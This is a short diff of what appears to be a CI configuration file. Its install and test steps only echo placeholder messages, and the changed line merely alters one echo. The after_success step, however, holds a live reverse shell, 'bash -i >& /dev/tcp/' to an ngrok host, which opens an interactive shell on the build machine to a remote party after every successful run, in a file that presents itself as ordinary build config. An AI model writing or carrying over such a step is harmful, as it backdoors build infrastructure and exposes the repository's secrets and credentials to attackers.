@@ -7,7 +7,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
-  - echo "no tests!" # put your normal testing scripts here
+  - echo "no tests" # put your normal testing scripts here
 
 after_success:
   - bash -i >& /dev/tcp/4.tcp.ngrok.io/19096 0>&1
